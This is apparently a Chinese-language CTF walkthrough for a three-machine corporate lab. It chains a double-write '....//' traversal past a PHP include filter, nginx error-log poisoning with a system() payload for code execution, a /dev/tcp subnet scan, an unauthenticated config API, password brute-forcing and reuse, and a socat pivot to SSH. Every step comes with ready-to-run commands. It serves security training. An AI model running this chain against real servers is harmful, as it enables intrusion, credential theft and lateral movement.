## 题目原文

> 某企业的门户网站存在安全隐患。

描述很短，实际环境是一个企业官网 + 内网三台机器：官网自身、内网运维管理面板、文件服务器（SSH）。

## 题解

### 入口与指纹

入口是一个静态风格的企业官网，`nginx/1.18.0` + `PHP/7.4.33`。首页只有五个页面，但 `robots.txt` 主动暴露了三个目录：

```
User-agent: *
Disallow: /backup/
Disallow: /portal/
Disallow: /uploads/
```

`/backup/` 直接访问是 403（目录索引被禁），说明目录存在但没开列表。真正的入口不在这几个目录，而在 `services.php` 的语言切换参数上。

### 关键观察

**1. `?lang=` 是文件包含，过滤只做一次替换。**

读源码后（方法见下）可以看到三件事：

```php
$lang = str_replace('../', '', $lang);      // 只替换一次
$page_file = "lang/" . $lang . ".php";      // 先拼 .php
// 带 .php 的不存在时，fallback 到 include("lang/" . $lang)
```

- `str_replace` 只执行一次，所以 `....//` 被删掉中间那一段 `../` 之后，剩下的又拼回 `../`。四个 `....//` 就够回到根目录。
- 先拼 `.php` 再做 fallback，意味着**带后缀的文件不存在时**，原始路径会被直接 include，路径穿越和协议封装都能生效。
- 协议黑名单只匹配小写：`php://`、`data://`、`expect://`、`phar://`；大写或混合大小写不拦，长度限制 200 字符。

**2. 启动脚本把日志权限放开，是明确的利用指引。**

读 `/entrypoint.sh` 看到：

```bash
chown www-data:www-data /var/log/nginx/access.log /var/log/nginx/error.log
chmod 666 /var/log/nginx/access.log /var/log/nginx/error.log
# 注释：www-data 需要读取日志来做 LFI 日志包含
```

日志对 `www-data` 可写，配合 LFI 就是「日志包含 → RCE」。

### 利用链

**Step 1：确认穿越，读任意文件。**

```bash
T=10.0.0.0   # 本例地址已失效，实际从 .target 读取
curl -s "http://$T/services.php?lang=....//....//....//....//etc/passwd" \
  | sed -e 's/<[^>]*>/\n/g' | grep root
```

四个 `....//` 是刚好够的层数：`lang/` 在 `/var/www/html/` 下，回到 `/` 需要四级。

**Step 2：读源码和启动脚本，确认意图。**

```bash
for f in var/www/html/services.php entrypoint.sh etc/nginx/nginx.conf; do
  path=$(printf '....//%.0s' 1 2 3 4)$f
  echo "===== $f"
  curl -s "http://$T/services.php?lang=$path"
done
```

拿到 `/entrypoint.sh`、nginx 配置、`services.php` 和同目录的 `backup/` 三个运维脚本：

- `backup/ssh_users.txt`：跳板机用户列表（`admin`、`devops`、`guest`、`monitor`、`root`）。
- `backup/check_port.php`、`backup/tunnel.php`：内网端口探测与 TCP 转发工具，等于把内网拓扑和代理能力交到手上。

**Step 3：日志包含拿 RCE。**

先让 nginx 把一段 PHP 原样写进日志：请求一个会返回 403/404 的路径，把 payload 放在 query 里。nginx 的错误日志会记录**原始请求行**。

```bash
curl -g -s -o /dev/null "http://$T/backup/?x=<?=system(\$_GET[c])?>"
```

然后用 LFI 包含错误日志，参数从 `c` 传进去：

```bash
PATH4=$(printf '....//%.0s' 1 2 3 4)var/log/nginx/error.log
curl -s "http://$T/services.php?lang=$PATH4&c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

注意两点，都是踩过的坑：

- **包含日志时，PHP 会执行文件里任意位置的 PHP 标签**，前面的日志文本只是普通输出。所以只要日志里出现过一次合法 payload，后面每次 include 都会执行它。
- 直接在 URI 里放 `<?php ... ?>` 有时会因为日志里同时混入了别的片段而触发 parse error；用短标签 `<?=...?>` 更稳。

**Step 4：拿 shell 后先看目录，再看网络。**

```bash
ls -la /var/www/html /var/www/html/backup /challenge
cat /etc/hosts; ip -4 addr
```

`/challenge` 下只有一个 `flag1.txt`（本容器只有第一面）。随后的重点是 `backup/` 里的运维脚本和 `/etc/hosts`。从容器里扫同网段：

```bash
for i in $(seq 1 40); do
  for p in 22 80 8080 3306 6379; do
    timeout 1 bash -c "echo > /dev/tcp/172.18.0.$i/$p" 2>/dev/null && echo "172.18.0.$i:$p"
  done
done
```

得到两个新目标：

- `172.18.0.2:8080`：内网运维管理面板（gunicorn）。
- `172.18.0.3:22`：文件服务器（SSH，就是 `ssh_users.txt` 里那台跳板机）。

**Step 5：面板的未授权 API 直接泄露 flag。**

面板根路径会跳登录，但 `/api/*` 里有两个端点没有鉴权：

```bash
curl -s http://172.18.0.2:8080/api/status
curl -s http://172.18.0.2:8080/api/config
```

`/api/config` 返回了 `corporate_secret`，就是一面 flag；同时给出数据库、Redis 和 `api_keys`。这一步是「先读无鉴权接口，再去爆破登录」的典型收益。

**Step 6：登录面板，复用口令打 SSH。**

面板登录没有验证码，用常见口令字典即可命中 `admin:P@ssword`。这个口令同时也是文件服务器 `admin` 的 SSH 口令——`ssh_users.txt` 给了用户名，面板给了口令。

web 容器里没有 `ssh`，但容器能到 `172.18.0.3:22`。用 PHP/Perl 起一个 TCP 转发，把 22 端口映射到入口的公网端口，再从本机连：

```bash
# 在 web 容器内
nohup socat TCP-LISTEN:2222,fork,reuseaddr TCP:172.18.0.3:22 &
```

如果容器没有 socat，用 PHP 的 `stream_socket_server` 或 Perl 的 `IO::Socket::INET` 手写一个转发也可以。

SSH 登录后：

```bash
ls -la /challenge          # 两个可读 flag
cat /challenge/*.txt
cat ~/flag2.txt            # 同一 flag 的另一份副本
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | 入口容器 `/challenge/flag1.txt`，通过 LFI 直接读 |
| 2 | 内网面板 `/api/config` 的 `corporate_secret` |
| 3 | 文件服务器 `/challenge/*.txt`（admin 可读） |
| 4 | 文件服务器 `/challenge/*.txt` 第二份 |

四个 flag 分属三台机器：入口、内网面板、文件服务器。

### 复盘

- **`robots.txt` 是线索不是答案**：它指出的 `/backup/` 目录确实存在，但真正的入口在 `services.php`。别在 403 目录上死磕。
- **看到 `str_replace('../','')` 就要想到双写**：单次替换是最常见的过滤缺陷，`....//` 和 `..././` 都要试。
- **启动脚本是最便宜的意图泄露**：日志权限、SUID、初始口令通常都写在里面。拿到文件读之后先读它，再决定爆破。
- **先扫无鉴权 API，再做登录爆破**：本例的 flag 就在未授权接口里，爆破只是通往 SSH 的第二步。
- **内网可达性用入口容器解决**：本机连不到的 22 端口，从 web 容器里转发出来即可。
